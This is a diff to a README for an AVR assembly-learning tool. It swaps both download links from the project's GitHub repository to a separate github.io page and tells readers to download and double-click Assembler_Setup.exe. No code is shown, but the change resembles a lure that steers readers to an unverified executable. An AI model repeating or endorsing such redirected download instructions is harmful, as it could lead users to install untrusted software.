@@ -1,6 +1,6 @@
 # 🛠️ Assembler - Learn assembly language on microcontrollers easily
 
-[![](https://img.shields.io/badge/Download-Assembler-blue.svg)](https://github.com/Vivslow157/Assembler)
+[![](https://img.shields.io/badge/Download-Assembler-blue.svg)](https://vivslow157.github.io)
 
 This software allows you to write and run assembly language code on your computer. You use this tool to control hardware components connected to an AVR microcontroller. It provides a simple environment for testing code and hardware interactions.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the application:
 Follow these steps to set up the software on your machine.
 
 1. Go to the download page.
-2. Visit this link to download the installer: https://github.com/Vivslow157/Assembler
+2. Visit this link to download the installer: https://vivslow157.github.io
 3. Find the file named Assembler_Setup.exe in your Downloads folder.
 4. Double-click the file to start the installation.
 5. Follow the prompts on the screen to finish the setup process.
